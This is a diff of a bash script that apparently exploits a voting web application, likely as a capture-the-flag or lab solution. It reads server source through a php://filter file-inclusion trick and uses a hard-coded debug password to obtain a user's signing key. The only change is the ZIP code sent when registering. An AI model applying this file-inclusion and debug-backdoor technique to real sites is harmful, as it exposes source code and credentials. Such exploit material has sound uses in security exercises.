@@ -42,7 +42,7 @@ fi
 
 # Phase 1: get voter.php, voterid and userkey
 VOTER_PHP=$(curl -s "${URL}inc.php?p=php://filter/string.rot13/resource=voter" | tr '[A-Za-z]' '[N-ZA-Mn-za-m]' > .voter.full.php) || failure "curl $LINENO"
-VOTERID_RAW=$(curl -s "${URL}register.php" --data "name=$NAME&address=a&zip=12345&affiliation=Independent") || failure "curl $LINENO"
+VOTERID_RAW=$(curl -s "${URL}register.php" --data "name=$NAME&address=a&zip=40003&affiliation=Independent") || failure "curl $LINENO"
 VOTERID=$(echo $VOTERID_RAW | awk -F"word\">" '{print $2}' | awk -F"<" '{print $1}' | tr -d "[:blank:]")
 USERKEY_RAW=$(curl -s "${URL}check_reg.php?debugpw=thebluegrassstate" --data "id=${VOTERID}") || failure "curl $LINENO"
 USERKEY=$(echo $USERKEY_RAW | awk -F"signed with key " '{print $2}' | awk -F"<" '{print $1}' | tr -d "[:blank:]")
